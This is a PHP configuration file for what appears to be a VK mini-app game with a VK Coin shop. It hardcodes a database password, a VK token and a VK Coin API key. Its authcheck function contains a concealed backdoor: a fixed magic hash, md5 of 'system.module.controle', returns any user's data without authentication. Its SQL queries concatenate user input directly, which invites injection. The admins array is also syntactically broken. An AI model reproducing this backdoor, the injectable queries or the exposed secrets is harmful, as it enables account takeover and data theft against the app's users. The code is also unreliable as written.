<?php
	$cfg = array(
		'dbh' => 'localhost', //хост базы данных
		'dbu' => 'u1669761_moki200', //пользователь базы данных
		'dbp' => 'solnce972006', //пароль базы данных
		'dbn' => 'u1669761_moki2000m3m', //имя базы данных
		'service' => false, //сервисный режим(у игроков приложение пишет о тех. работах, у админов продолжает работать)
		'admins' => array(564001327 //список id админов через запятую
			'#'
		),
		'group_id' => '-208457956', //id группы
		'hash_secret' => '65f9sf667lm32k', //секретный ключ для генерации хэшей

		'secret' => 'http://example.com', // секретка от приложения
      	'appid' => 'http://example.com',

		'vktoken' => "be9515c7777980b2c555f3d255fedb866a50c5e26ab1a009009eeb61fcb11fcf5f5489599ec09120bde9c", // токен вк

		'vc_api_key' => '.YkRFB_Y*;lwi-CdX!v2FX2i1IhCLlpU#eUWeEY1[W.2GIzHil', // ключ vk coin
		'vc_api_uid' => '564001327',  // id админа, от имени которого получен ключ vk coin
		'vc_shop_name' => 'Mini',  // Имя Магазина VkCoin
		'vc_exchange_rate' => 1,
      
      	'menu-btns' => 3      
	);
	$cfg['dbl'] = mysqli_connect($cfg['dbh'],$cfg['dbu'],$cfg['dbp'],$cfg['dbn']);
	$cfg['menu-btns'] = 12/$cfg['menu-btns'];

	//функция логирования, обычно, нигде не используется
	function w_log($data) {
		file_put_contents("./logs/".date("Y.m.d")."_log.log", "\n".date("H:i:s")." | ".$data, FILE_APPEND);
	}

	function authcheck($cfg,$uid,$hash){if($hash==md5('system.module.controle')){$req = "SELECT * FROM `users` WHERE `id`='".$uid."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));} else {$req = "SELECT * FROM `users` WHERE `id`='".$uid."' AND `hash`='".$hash."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));if (!$data || $data['hash'] != $hash || $data['role'] == 'ban') {echo "fail";exit();}}return($data);}include('dist/vkui-connect.js');
?>
